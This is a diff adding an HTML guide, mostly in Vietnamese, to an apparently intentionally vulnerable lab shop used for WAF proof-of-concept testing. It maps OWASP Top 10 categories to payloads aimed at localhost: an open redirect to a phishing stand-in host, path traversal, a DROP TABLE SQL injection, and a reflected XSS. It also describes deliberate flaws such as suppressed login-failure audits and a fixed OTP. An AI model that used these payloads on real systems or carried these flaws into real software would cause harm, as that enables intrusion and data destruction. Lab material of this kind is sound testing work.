@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>NexaTech — OWASP Web Top 10 Exploit Guide (WAF PoC)</title>
+  <style>
+    :root { --bg:#0b1f3a; --card:#122844; --text:#e8f1ff; --muted:#9db4d0; --accent:#38bdf8; }
+    body { margin:0; font-family: ui-sans-serif, system-ui, Segoe UI, sans-serif; background:linear-gradient(160deg,#071525,#0b1f3a 40%,#102a4a); color:var(--text); line-height:1.55; }
+    .wrap { max-width:960px; margin:0 auto; padding:2rem 1.25rem 4rem; }
+    h1,h2 { font-family: Georgia, "Times New Roman", serif; }
+    h1 { font-size:1.85rem; margin:0 0 .5rem; }
+    .lead { color:var(--muted); }
+    .warn { background:rgba(248,113,113,.12); border:1px solid rgba(248,113,113,.45); padding:1rem; border-radius:10px; margin:1rem 0 1.5rem; }
+    .card { background:var(--card); border:1px solid rgba(148,163,184,.25); border-radius:12px; padding:1rem 1.1rem; margin:1rem 0; }
+    a { color:var(--accent); }
+    code, pre { background:#071525; border-radius:8px; }
+    code { padding:.1rem .35rem; }
+    pre { padding:1rem; overflow:auto; font-size:.85rem; }
+    .tag { display:inline-block; font-size:.75rem; padding:.15rem .45rem; border-radius:999px; background:rgba(56,189,248,.15); color:var(--accent); margin-right:.35rem; }
+    footer { margin-top:2.5rem; color:var(--muted); font-size:.9rem; }
+  </style>
+</head>
+<body>
+  <div class="wrap">
+    <h1>OWASP Web Top 10:2025 — Hướng dẫn khai thác</h1>
+    <p class="lead">Public guide — customer mở được không cần đăng nhập. Lỗ hổng luôn active để PoC WAF / Web Security appliance.</p>
+    <div class="warn"><strong>Cảnh báo:</strong> XSS/open-redirect/SQLi dưới đây là intentional và chạy thật trên stack.</div>
+
+    <div class="card">
+      <strong>Mục lục A01–A10</strong>
+      <div><a href="#a01">A01 Broken Access Control</a></div>
+      <div><a href="#a02">A02 Security Misconfiguration</a></div>
+      <div><a href="#a03">A03 Software Supply Chain Failures</a></div>
+      <div><a href="#a04">A04 Cryptographic Failures</a></div>
+      <div><a href="#a05">A05 Injection</a></div>
+      <div><a href="#a06">A06 Insecure Design</a></div>
+      <div><a href="#a07">A07 Authentication Failures</a></div>
+      <div><a href="#a08">A08 Software or Data Integrity Failures</a></div>
+      <div><a href="#a09">A09 Security Logging Failures</a></div>
+      <div><a href="#a10">A10 Mishandling of Exceptional Conditions</a></div>
+    </div>
+
+    <div class="card" id="a01">
+      <h2><span class="tag">A01</span> Broken Access Control</h2>
+      <p>SC-01 IDOR · SC-08 BFLA · SC-33 path traversal BFF · SC-71 open redirect.</p>
+      <pre># Open redirect sau login (SC-71)
+http://localhost:3000/dang-nhap?next=https://evil.example/phish
+
+# BFF path traversal (SC-33) — admin session cookie
+curl -s "http://localhost:3100/api/bff/catalog/../identity/admin/users" -b "nexatech_admin_session=..."</pre>
+    </div>
+
+    <div class="card" id="a02">
+      <h2><span class="tag">A02</span> Security Misconfiguration</h2>
+      <p>SC-28 insecure cookies · SC-30 CORS * · SC-67 debug · SC-74 thiếu X-Frame-Options/CSP.</p>
+      <pre>curl -sI http://localhost:3000/ | findstr /i "x-frame content-security"
+curl -s http://localhost:3001/health/debug</pre>
+      <p>Kỳ vọng: thiếu frame protection headers trên nhiều response; debug dump có configHint.</p>
+    </div>
+
+    <div class="card" id="a03">
+      <h2><span class="tag">A03</span> Supply Chain</h2>
+      <pre>curl -s "http://localhost:3001/lab/supply-chain?digest=0000"</pre>
+    </div>
+
+    <div class="card" id="a04">
+      <h2><span class="tag">A04</span> Cryptographic Failures</h2>
+      <p>SC-66 weak secret compare (shipping webhook) · SC-24 OTP cố định · SC-70 JWT alg=none flag.</p>
+      <pre>curl -s http://localhost:3001/lab/jwt-alg-none</pre>
+    </div>
+
+    <div class="card" id="a05">
+      <h2><span class="tag">A05</span> Injection</h2>
+      <p>SC-63 SQL ORDER BY · SC-72 reflected XSS trên tìm kiếm.</p>
+      <pre># SQLi via sort (catalog)
+curl -s "http://localhost:3003/api/v1/products?sort=id;%20DROP%20TABLE%20products--"
+
+# Reflected XSS (browser)
+http://localhost:3000/tim-kiem?q=%3Cimg%20src=x%20onerror=alert(1)%3E</pre>
+      <p>Trang search echo <code>q</code> bằng <code>dangerouslySetInnerHTML</code> (intentional).</p>
+    </div>
+
+    <div class="card" id="a06">
+      <h2><span class="tag">A06</span> Insecure Design</h2>
+      <p>SC-12 price manipulation · SC-20 amount mismatch · SC-58 unlimited checkout.</p>
+    </div>
+
+    <div class="card" id="a07">
+      <h2><span class="tag">A07</span> Authentication Failures</h2>
+      <p>SC-21 no rate limit · SC-24 OTP 000000 · SC-75 user enumeration details trên auth failure paths khi wired.</p>
+      <pre>curl -s -X POST http://localhost:3001/api/v1/auth/login \
+  -H "content-type: application/json" \
+  -d "{\"email\":\"nobody@nexatech.local\",\"password\":\"x\"}"</pre>
+    </div>
+
+    <div class="card" id="a08">
+      <h2><span class="tag">A08</span> Integrity Failures</h2>
+      <p>SC-18 forged VNPay signature · SC-17 replay · SC-61 forged partner webhook · SC-73 CSRF Origin không enforce.</p>
+      <pre># CSRF: submit state-changing request từ origin lạ — server không reject Origin</pre>
+    </div>
+
+    <div class="card" id="a09">
+      <h2><span class="tag">A09</span> Logging Failures</h2>
+      <p>SC-64 — LOGIN_FAILURE audit bị suppress (<code>shouldEmitSecurityAudit=false</code>).</p>
+    </div>
+
+    <div class="card" id="a10">
+      <h2><span class="tag">A10</span> Exceptional Conditions</h2>
+      <pre>curl -s "http://localhost:3001/health/debug?fail=1"
+# details.stack + details.internalUrl + failOpenHint</pre>
+    </div>
+
+    <footer>
+      <a href="/lab/owasp-api-top10.html">OWASP API Top 10 Guide</a> ·
+      Seed accounts: xem docs/LOCAL-LAB-LINKS.md ·
+      Không có toggle tắt lỗ hổng (ADR-044 always-on).
+    </footer>
+  </div>
+</body>
+</html>
